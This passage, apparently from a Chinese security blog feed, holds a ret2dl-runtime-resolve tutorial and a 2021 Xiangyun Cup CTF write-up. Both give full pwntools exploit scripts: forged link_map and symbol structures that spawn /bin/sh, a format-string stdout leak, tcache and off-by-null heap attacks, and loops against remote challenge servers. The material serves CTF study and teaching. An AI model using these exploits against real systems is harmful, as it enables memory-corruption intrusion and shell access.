payload=’a’*0x6c+p32(bss_addr)+p32(read_plt)+p32(pppr)+p32(0)+p32(bss_addr)+p32(100)<br>    payload+=p32(pop_ebp)+p32(bss_addr)+p32(leaver)<br>    io.send(payload)</p><pre><code>reloc_index=bss_addr+0x14-rel_pltr_sym=(bss_addr+0x38-dynsym)/0x10r_type=0x7    r_info=(r_sym&lt;&lt;8)+(r_type&amp;0xff)print(hex(r_info))fake_rel=p32(strlen_got)+p32(r_info)st_name=bss_addr+0x48-dynstrfake_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)payload=&#39;aaaa&#39;#new ebppayload+=p32(plt_0)+p32(reloc_index)+&#39;aaaa&#39;+p32(bss_addr+0x54)payload+=fake_relpayload+=&#39;aaaa&#39;*7payload+=fake_sympayload+=&#39;system\x00&#39;payload+=&#39;bbbbb&#39;payload+=&#39;/bin/sh\x00&#39;payload=payload.ljust(100,&#39;a&#39;)gdb.attach(io)io.sendline(payload)io.interactive()</code></pre><p>exp()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**3.伪造link_map**</span><br><span class="line"></span><br><span class="line">我们伪造link_map，让**sym-&gt;st_value为某个已经解析了的函数的地址**,比如read，让l-&gt;l_addr为我们需要的函数(system)到read的偏移,这样,l-&gt;l_addr + sym-&gt;st_value就是我们需要的函数地址。 </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) {<br>        …<br>} else {<br>        /* We already found the symbol.  The module (and therefore its load<br>        address) is also known.  */<br>        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);<br>        result = l;<br>}  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>typedef struct<br>{<br>  Elf64_Word    st_name;        /* Symbol name (string tbl index) <em>/<br>  unsigned char st_info;        /</em> Symbol type and binding <em>/<br>  unsigned char st_other;       /</em> Symbol visibility <em>/<br>  Elf64_Section st_shndx;       /</em> Section index <em>/<br>  Elf64_Addr    st_value;       /</em> Symbol value <em>/<br>  Elf64_Xword   st_size;        /</em> Symbol size */<br>} Elf64_Sym;  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">如果，我们把read_got – 0x8处开始当成sym，那么sym-&gt;st_value就是read的地址，并且sym-&gt;st_other正好也不为0，绕过了if。</span><br><span class="line"></span><br><span class="line">为了伪造link_map，我们需要知道link_map的结构，在glibc/include/link.h文件里，link_map结构比较复杂，但是，我们只需伪造需要用到的数据即可。</span><br><span class="line"></span><br><span class="line">我们需要伪造这个数组里的几个指针，它们分别是</span><br><span class="line"></span><br><span class="line">DT_STRTAB指针：位于link_map_addr +0x68(32位下是0x34)</span><br><span class="line"></span><br><span class="line">DT_SYMTAB指针：位于link_map_addr + 0x70(32位下是0x38)</span><br><span class="line"></span><br><span class="line">DT_JMPREL指针：位于link_map_addr +0xF8(32位下是0x7C)</span><br><span class="line"></span><br><span class="line">exp：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>#coding:utf8<br>from pwn import *  </p><p>sh = process(‘./test-64’)<br>elf = ELF(‘./test-64’)<br>libc = elf.libc<br>context.log_level=’debug’<br>read_plt = elf.plt[‘read’]<br>read_got = elf.got[‘read’]<br>fun_addr = elf.sym[‘fun’]  </p><p>#bss段<br>bss = 0x601038  </p><p>l_addr = libc.sym[‘system’] - libc.sym[‘read’]<br>#注意，只要是可读写的内存地址即可，调试看看就知道了<br>r_offset = bss + l_addr * -1  </p><p>#负数需要补码<br>if l_addr &lt; 0:<br>   l_addr = l_addr + 0x10000000000000000  </p><p>pop_rdi = 0x4005c3<br>#pop rsi ; pop r15 ; ret<br>pop_rsi = 0x4005c1<br>#用于解析符号dl_runtime_resolve<br>plt_load = 0x4003f6 </p><p>#第一次继续调用read输入伪造的数据结构，然后再一次调用fun来输入rop<br>payload = ‘a’*0x28 + p64(pop_rsi) + p64(bss + 0x100) + p64(0) + p64(pop_rdi) + p64(0) + p64(read_plt) + p64(fun_addr)  </p><p>sh.sendline(payload)<br>raw_input()<br>#真正的dynstr的地址<br>dynstr = 0x400318<br>#我们准备把link_map放置在bss+0x100处<br>fake_link_map_addr = bss + 0x100<br>#假的dyn_strtab<br>fake_dyn_strtab_addr = fake_link_map_addr + 0x8<br>fake_dyn_strtab = p64(0) + p64(dynstr) #fake_link_map_addr + 0x8<br>#假的dyn_symtab，我们要让对应的dynsym里的st_value指向一个已经解析过的函数的got表<br>#其他字段无关紧要，所以，我们让dynsym为read_got - 0x8，这样，相当于把read_got - 0x8处开始当做一个dynsym，这样st_value正好对应了read的地址<br>#并且(*(sym+5))&amp;0x03 != 0也成立<br>fake_dyn_symtab_addr = fake_link_map_addr + 0x18<br>fake_dyn_symtab = p64(0) + p64(read_got - 0x8) #fake_link_map_addr + 0x18<br>#假的dyn_rel<br>fake_dyn_rel_addr = fake_link_map_addr + 0x28<br>fake_dyn_rel = p64(0) + p64(fake_link_map_addr + 0x38) #fake_link_map_addr + 0x28<br>#假的rel.plt<br>fake_rel = p64(r_offset) + p64(0x7) + p64(0) #fake_link_map_addr + 0x38<br>#l_addr<br>fake_link_map = p64(l_addr)<br>#由于link_map的中间部分在我们的攻击中无关紧要，所以我们把伪造的几个数据结构也放当中<br>fake_link_map += fake_dyn_strtab<br>fake_link_map += fake_dyn_symtab<br>fake_link_map += fake_dyn_rel<br>fake_link_map += fake_rel<br>fake_link_map = fake_link_map.ljust(0x68,’\x00’)<br>#dyn_strtab的指针<br>fake_link_map += p64(fake_dyn_strtab_addr)<br>#dyn_strsym的指针<br>fake_link_map += p64(fake_dyn_symtab_addr) #fake_link_map_addr + 0x70<br>#存入/bin/sh字符串<br>fake_link_map += ‘/bin/sh’.ljust(0x80,’\x00’)<br>#在fake_link_map_addr + 0xF8处，是rel.plt指针<br>fake_link_map += p64(fake_dyn_rel_addr)  </p><p>sh.sendline(fake_link_map)<br>#sleep(1)<br>raw_input()<br>gdb.attach(sh)<br>#现在，我们伪造好了link_map，那么，我们就可以来解析system了<br>rop = ‘A’*0x28 + p64(pop_rdi) + p64(fake_link_map_addr + 0x78)  + p64(plt_load) + p64(fake_link_map_addr) + p64(0)<br>sh.sendline(rop)  </p><p>sh.interactive() </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**4.full relro**</span><br><span class="line"></span><br><span class="line"> 程序在运行之前就已经调用了ld.so将所需的外部函数加载完成，程序运行期间不再动态加载，因此，在程序的got表中，link_map和dl_runtime_resolve函数的地址都为0，因为后续不再使用，没有必要。 </span><br><span class="line"></span><br><span class="line">因此在FULL_RELRO的情况下，要想利用ret2dl-runtime-resolve技术，就只能在栈中低位覆盖数据一定几率恢复出dl_runtime_resolve。</span><br><span class="line"></span><br><span class="line">比如在glibc2.27下，我们低位覆盖这个数据，有很大几率指向dl_runtime_resolve函数的地址，然后，link_map我们可以在我们可控的地方伪造。</span><br><span class="line"></span><br><span class="line">这里，介绍一种其他的方法来针对FULL_RELRO的方案来getshell，那就是低位覆盖栈中数据一定几率指向syscall，构造execve(“/bin/sh”,0,0)系统调用。要构造这样的ROP，其他gadget容易搞定，关键是edx必须为0，不然调用会出错，然而，pop edx或pop rdx这样的gadget基本没有，因此，我们可以ret2csu，来控制edx。</span><br><span class="line"></span><br><span class="line">**工具自动化生成**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>from roputils import *<br>from pwn import process<br>from pwn import gdb<br>from pwn import context<br>r = process(‘./pwn200’)<br>context.log_level = ‘debug’<br>r.recv()</p><p>rop = ROP(‘./pwn200’)<br>offset = 112<br>bss_base = rop.section(‘.bss’)+0x500<br>buf = rop.fill(offset)</p><p>buf += rop.call(‘read’, 0, bss_base, 100)</p><h2 id="used-to-call-dl-Resolve"><a href="#used-to-call-dl-Resolve" class="headerlink" title="used to call dl_Resolve()"></a>used to call dl_Resolve()</h2><p>buf += rop.dl_resolve_call(bss_base + 40, bss_base)<br>r.send(buf)</p><p>buf = rop.string(‘/bin/sh’)<br>buf += rop.fill(40, buf)</p><h2 id="used-to-make-faking-data-such-relocation-Symbol-Str"><a href="#used-to-make-faking-data-such-relocation-Symbol-Str" class="headerlink" title="used to make faking data, such relocation, Symbol, Str"></a>used to make faking data, such relocation, Symbol, Str</h2><p>buf += rop.dl_resolve_data(bss_base + 40, ‘system’)<br>buf += rop.fill(100, buf)<br>r.send(buf)<br>r.interactive()</p><p>```</p><p><strong>参考</strong></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/104478081">https://blog.csdn.net/seaaseesa/article/details/104478081</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>xiangyuncup</title>
      <link href="/2021/09/03/xiangyuncup/"/>
      <url>/2021/09/03/xiangyuncup/</url>
      
        <content type="html"><![CDATA[<h3 id="祥云杯部分pwn-glibc-2-31下的largebin-attack"><a href="#祥云杯部分pwn-glibc-2-31下的largebin-attack" class="headerlink" title="祥云杯部分pwn (glibc-2.31下的largebin attack)"></a>祥云杯部分pwn (glibc-2.31下的largebin attack)</h3><span id="more"></span><p><em>两周前打的一次比赛，一直想写wp记录一下比赛的过程，奈何杂事太多，自己也静不下心来，因此一直拖到了现在。</em></p><h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><p>格式化字符串漏洞，漏洞点如下：</p><p><img src="/2021/09/03/xiangyuncup/image-20210903191722945.png" class="lazyload placeholder" data-srcset="/2021/09/03/xiangyuncup/image-20210903191722945.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210903191722945"></p><p>其中scanf和printf相似，所不同的是scanf中的%s可以直接写向栈上的指针指向的内存区域，因此我们就可以进行任意地址写操作。又再栈中发现_IO_2_1_stdoutd的地址，所以我们直接打stdout泄露libc_base，再利用栈中保存的栈上的地址，我们直接写入system函数地址。</p><p>完整exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./note&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span><br><span class="line">#io = remote(&#x27;47.104.70.90&#x27;,25315)</span><br><span class="line">libc = ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(size,context):</span><br><span class="line">    io.sendlineafter(&#x27;choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;size: &#x27;,str(size))</span><br><span class="line">    io.sendafter(&#x27;content: &#x27;,context)</span><br><span class="line"></span><br><span class="line">def say(say,context):</span><br><span class="line">    io.sendlineafter(&#x27;choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;say ? &#x27;,say)</span><br><span class="line">    io.sendafter(&#x27;? &#x27;,context)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    io.sendlineafter(&#x27;choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line">    </span><br><span class="line">def exp():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    say(&#x27;%7$s&#x27;,p64(0xfbad1887)+p64(0)*3+&#x27; &#x27;)</span><br><span class="line">    raw_input()</span><br><span class="line">    io.sendline(&#x27;3&#x27;)</span><br><span class="line">    io.recv(0x80)</span><br><span class="line">    stdin=u64(io.recvuntil(&#x27;\x7f&#x27;,timeout=1)[-6:].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">    libc_base = stdin - libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]    </span><br><span class="line">    print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">    system  = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">    pop_rdi = libc_base + 0x0000000000021112</span><br><span class="line">    binsh = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line"></span><br><span class="line">    say(&#x27;%17$s&#x27;,&#x27;a&#x27;*8+p64(pop_rdi)+p64(binsh)+p64(system)+&#x27; &#x27;)</span><br><span class="line">    raw_input()</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    io.sendline(&#x27;1&#x27;)</span><br><span class="line">    io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="lemon-pwn"><a href="#lemon-pwn" class="headerlink" title="lemon_pwn"></a>lemon_pwn</h3><p>输入一串数字，如果满足要求，可以将flag写入栈中。因为没有设置种子，所以rand()是伪随机数。</p><p><img src="/2021/09/03/xiangyuncup/image-20210903195246777.png" class="lazyload placeholder" data-srcset="/2021/09/03/xiangyuncup/image-20210903195246777.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210903195246777"></p><p>利用如下脚本获得v1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for buf in range(0xa7778200000,0x100000000000):</span><br><span class="line">    v1 = (buf&gt;&gt;32) ^ (buf&amp;0xffffffff) | (3 * (buf&amp;0xffffffff) - (buf&gt;&gt;32)) &amp; ((buf&amp;0xffffffff) // (buf&gt;&gt;32))</span><br><span class="line">    print(hex(v1))</span><br><span class="line">    if v1 == 0x783D9E5F:</span><br><span class="line">        print(hex(buf))</span><br><span class="line">        break</span><br><span class="line">print(&#x27;end&#x27;)</span><br></pre></td></tr></table></figure><p>进入主逻辑，发现有沙箱，禁用了execve函数，因此我们使用open，read，write输出flag</p><p><img src="/2021/09/03/xiangyuncup/image-20210903195652440.png" class="lazyload placeholder" data-srcset="/2021/09/03/xiangyuncup/image-20210903195652440.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210903195652440"></p><p>在color操作中发现可以对指针更改并且可以写，但只能使用一次，我们利用这次机会来控制tcache_struct。</p><p><img src="/2021/09/03/xiangyuncup/image-20210903200715050.png" class="lazyload placeholder" data-srcset="/2021/09/03/xiangyuncup/image-20210903200715050.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210903200715050"></p><p>控制tcache_struct后就是堆风水的问题了，我们连续打3次stdout，第一次获得libc_base，第二次利用libc中的environ得到stack_addr，最后一次直接泄露flag。本题能连续打三次stdout包含着很大的运气成分。</p><p>完整exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process([&#x27;./ld-2.26.so&#x27;,&#x27;./lemon_pwn&#x27;],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.26.so&#x27;&#125;)</span><br><span class="line"></span><br><span class="line">libc = ELF(&#x27;./libc-2.26.so&#x27;)</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(index,name,length,context):</span><br><span class="line">    io.sendlineafter(&#x27;choice &gt;&gt;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;index of your lemon: \n&#x27;,str(index))</span><br><span class="line">    io.sendafter(&#x27;name your lemon: \n&#x27;,name)</span><br><span class="line">    io.sendlineafter(&#x27;length of message for you lemon: \n&#x27;,str(length))</span><br><span class="line">    if length &lt;= 1024:</span><br><span class="line">io.sendafter(&#x27;message: \n&#x27;,context)</span><br><span class="line"></span><br><span class="line">def eat(index):</span><br><span class="line">    io.sendlineafter(&#x27;choice &gt;&gt;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;index of your lemon : \n&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def throw(index): </span><br><span class="line">    io.sendlineafter(&#x27;choice &gt;&gt;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;index of your lemon : \n&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def color(index,context):</span><br><span class="line">    io.sendlineafter(&#x27;choice &gt;&gt;&gt; &#x27;,&#x27;4&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;index of your lemon  : \n&#x27;,str(index))</span><br><span class="line">    io.sendafter(&#x27;draw and color!\n&#x27;,context)</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">def exp():</span><br><span class="line">    io.sendlineafter(&#x27;me?\n&#x27;,&#x27;yes&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27; number: \n&#x27;,p32(0x78348c28)+p8(0x77))</span><br><span class="line">    io.recvuntil(&#x27;first: \n&#x27;)</span><br><span class="line">    io.sendline(&#x27;f1ag&#x27;)</span><br><span class="line">    </span><br><span class="line">    add(1,&#x27;flag\n&#x27;,48,&#x27;aaaa\n&#x27;)</span><br><span class="line">    add(2,&#x27;a\n&#x27;,144,&#x27;a\n&#x27;)</span><br><span class="line">    add(3,&#x27;a\n&#x27;,96,&#x27;a\n&#x27;)</span><br><span class="line">    add(0,&#x27;f1ag\n&#x27;,32,&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">    eat(1)</span><br><span class="line">    io.recvuntil(&#x27;eat eat eat &#x27;)</span><br><span class="line">    addr=int(io.recv(5))</span><br><span class="line">    print(hex(addr))</span><br><span class="line">    color(1,&#x27;b&#x27;*0x10+p32(0x40)+p32(1)+p16(addr-0x250))</span><br><span class="line">    throw(3)</span><br><span class="line">    throw(1)</span><br><span class="line">    add(1,&#x27;a\n&#x27;,576,&#x27;\x00&#x27;*8+&#x27;\x07&#x27;+&#x27;\x00&#x27;*0x37)</span><br><span class="line"></span><br><span class="line">    throw(2)</span><br><span class="line">    throw(1)</span><br><span class="line">    #add(3,&#x27;a\n&#x27;,16,&#x27;a\n&#x27;)</span><br><span class="line">    add(1,&#x27;a\n&#x27;,576,&#x27;\x00&#x27;*7+&#x27;\x07&#x27;+&#x27;\x00&#x27;*0x38+p64(0)*5+p16(addr+0xd0))</span><br><span class="line">    add(2,&#x27;a\n&#x27;,96,&#x27;a\n&#x27;)</span><br><span class="line">    throw(1)</span><br><span class="line">    add(1,&#x27;a\n&#x27;,576,&#x27;\x00&#x27;*7+&#x27;\x00&#x27;+&#x27;\x00&#x27;*0x38+p64(0)*5+p16(0x86ed))</span><br><span class="line">    add(2,&#x27;a\n&#x27;,96,&#x27;a&#x27;*0x33+p64(0xfbad1887)+p64(0)*3+&#x27;\x88&#x27;)</span><br><span class="line"></span><br><span class="line">    stdin=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">    libc_base = stdin-libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]</span><br><span class="line">    stdout = libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]</span><br><span class="line"></span><br><span class="line">    print(hex(libc_base))</span><br><span class="line">    environ = libc_base+libc.symbols[&#x27;_environ&#x27;]</span><br><span class="line">    throw(1)</span><br><span class="line">    add(1,&#x27;a\n&#x27;,576,&#x27;\x00&#x27;*7+&#x27;\x00&#x27;+&#x27;\x00&#x27;*0x38+p64(0)*5+p64(stdout-0x33))</span><br><span class="line">    throw(0)</span><br><span class="line">    add(2,&#x27;a\n&#x27;,104,&#x27;a&#x27;*0x33+p64(0xfbad1887)+p64(0)*3+p64(environ)+p64(environ+8))</span><br><span class="line"></span><br><span class="line">    stack=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-0x180</span><br><span class="line">    print(hex(stack))</span><br><span class="line">    add(0,&#x27;b&#x27;,48,&#x27;a\n&#x27;)</span><br><span class="line">    throw(1)</span><br><span class="line">    add(1,&#x27;a\n&#x27;,576,&#x27;\x00&#x27;*7+&#x27;\x00&#x27;+&#x27;\x00&#x27;*0x38+p64(0)*5+p64(stdout-0x33))</span><br><span class="line">    throw(0)</span><br><span class="line">    add(2,&#x27;a\n&#x27;,104,&#x27;a&#x27;*0x33+p64(0xfbad1887)+p64(0)*3+p64(stack-4)+p64(stack+0x28))</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    io.interactive()</span><br><span class="line">    </span><br><span class="line">i=0</span><br><span class="line">while(i!=0x20):</span><br><span class="line">   try:</span><br><span class="line">#io=process([&#x27;./ld-2.26.so&#x27;,&#x27;./lemon_pwn&#x27;],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.26.so&#x27;&#125;)    </span><br><span class="line">io = remote(&#x27;47.104.70.90&#x27;,34524)</span><br><span class="line">        exp()</span><br><span class="line">i+=1</span><br><span class="line">   except:</span><br><span class="line">io.close()</span><br><span class="line">i+=1</span><br></pre></td></tr></table></figure><h3 id="pwdFree"><a href="#pwdFree" class="headerlink" title="pwdFree"></a>pwdFree</h3><p>常规的一道堆题，off-by-null，注意在写入数据时要和泄露出来的key异或。</p><p><img src="/2021/09/03/xiangyuncup/image-20210903201559653.png" class="lazyload placeholder" data-srcset="/2021/09/03/xiangyuncup/image-20210903201559653.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210903201559653"></p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io = process(&#x27;./pwdFree&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span><br><span class="line">io = remote(&#x27;47.104.71.220&#x27; ,38562)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(name,length,context):</span><br><span class="line">    io.sendlineafter(&#x27;Choice:\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;ID You Want Save:&#x27;,name)</span><br><span class="line">    io.sendlineafter(&#x27;Length Of Your Pwd:&#x27;,str(length))</span><br><span class="line">    io.sendafter(&#x27;Your Pwd:&#x27;,context)</span><br><span class="line"></span><br><span class="line">def edit(index,context):</span><br><span class="line">    io.sendlineafter(&#x27;Choice:\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">    raw_input()</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    raw_input()</span><br><span class="line">    io.send(context)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    io.sendlineafter(&#x27;Choice:\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Check:\n&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">    io.sendlineafter(&#x27;Choice:\n&#x27;,&#x27;4&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27; Delete:\n&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    add(&#x27;0&#x27;,0xf8,&#x27;0\n&#x27;)#0</span><br><span class="line">    io.recvuntil(&#x27;Save ID:&#x27;)</span><br><span class="line">    io.recv(8)</span><br><span class="line">    key=u64(io.recv(8))</span><br><span class="line">    print(&#x27;key&#x27;,hex(key))</span><br><span class="line">    add(&#x27;1&#x27;,0x38,&#x27;1\n&#x27;)#1</span><br><span class="line">    add(&#x27;2&#x27;,0x38,&#x27;2\n&#x27;)#2</span><br><span class="line">    add(&#x27;3&#x27;,0x38,&#x27;3\n&#x27;)#3</span><br><span class="line">    add(&#x27;4&#x27;,0x38,&#x27;4\n&#x27;)#4</span><br><span class="line">    add(&#x27;5&#x27;,0xf8,&#x27;5\n&#x27;)#5</span><br><span class="line">    add(&#x27;6&#x27;,0xf8,&#x27;6\n&#x27;)#6</span><br><span class="line">    add(&#x27;7&#x27;,0xf8,&#x27;7\n&#x27;)#7</span><br><span class="line">    dele(6)</span><br><span class="line">    add(&#x27;6&#x27;,0xf8,&#x27;6&#x27;*0xf0+p64(0x400^key)+&#x27;\n&#x27;)#6</span><br><span class="line"></span><br><span class="line">    for i in range(7):</span><br><span class="line">add(&#x27;8&#x27;,0xf8,&#x27;8\n&#x27;)#8~14</span><br><span class="line">    for i in range(7):</span><br><span class="line">dele(14-i)</span><br><span class="line"></span><br><span class="line">    dele(0)</span><br><span class="line">    dele(7)#merge 0x500</span><br><span class="line">    for i in range(7):</span><br><span 